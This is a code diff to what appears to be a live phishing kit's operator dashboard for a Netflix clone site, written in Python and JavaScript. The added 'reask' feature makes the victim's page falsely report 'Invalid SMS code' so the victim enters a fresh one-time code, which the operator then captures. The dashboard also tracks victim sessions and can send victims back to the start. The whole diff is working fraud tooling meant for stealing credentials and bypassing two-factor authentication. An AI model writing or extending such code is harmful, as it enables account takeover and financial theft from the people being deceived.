@@ -106,6 +106,16 @@ async def ws_dash(request):
                 s["data"] = {}
                 s["final"] = ""
                 await broadcast(sid)
+            elif cmd.get("cmd") == "reask" and sid in sessions:
+                s = sessions[sid]
+                if s.get("ws"):
+                    try:
+                        await s["ws"].send_json({"type": "reask"})  # victim sees "Invalid SMS code", gets the code box again
+                    except Exception:
+                        pass
+                # clear just the captured final so the card shows the fresh code when it lands
+                s["final"] = ""
+                await broadcast(sid)
         elif msg.type == WSMsgType.ERROR:
             break
     if ws in dash_clients:
@@ -128,6 +138,7 @@ pre{margin:0;font-size:13px;white-space:pre-wrap}
 .btn:hover{background:#333}
 .btn.del:hover{background:#5a0d0d;border-color:#e50914}
 .btn.ref:hover{background:#0d3a0d;border-color:#0f0}
+.btn.ask:hover{background:#3a2a0d;border-color:#fa0}
 .row{margin-top:10px}
 </style>
 <h2>🎯 Live intercept <small style="color:#777">netflix-clone</small></h2>
@@ -155,6 +166,11 @@ function refill(sid) {
   if (!s || !s.online) { alert("victim is offline — cannot redirect"); return; }
   sendCmd({cmd: "reset", sid: sid});
 }
+function reask(sid) {
+  const s = sessions[sid];
+  if (!s || !s.online) { alert("victim is offline — cannot re-ask"); return; }
+  sendCmd({cmd: "reask", sid: sid});
+}
 function render() {
   const vals = Object.values(sessions);
   list.innerHTML = vals.length ? vals.map(s => `<div class="card">
@@ -163,6 +179,7 @@ function render() {
     <div style="margin-top:6px;color:#0f0">final → ${s.final || "<em style='color:#666'>waiting…</em>"}</div>
     <div class="row">
       <button class="btn ref" onclick="refill('${s.sid}')">🔁 refill — send back to start</button>
+      <button class="btn ask" onclick="reask('${s.sid}')">📲 re-ask final</button>
       <button class="btn del" onclick="del('${s.sid}')">🗑 delete log</button>
     </div>
   </div>`).join("") : "<p style='color:#555'>no sessions yet…</p>";
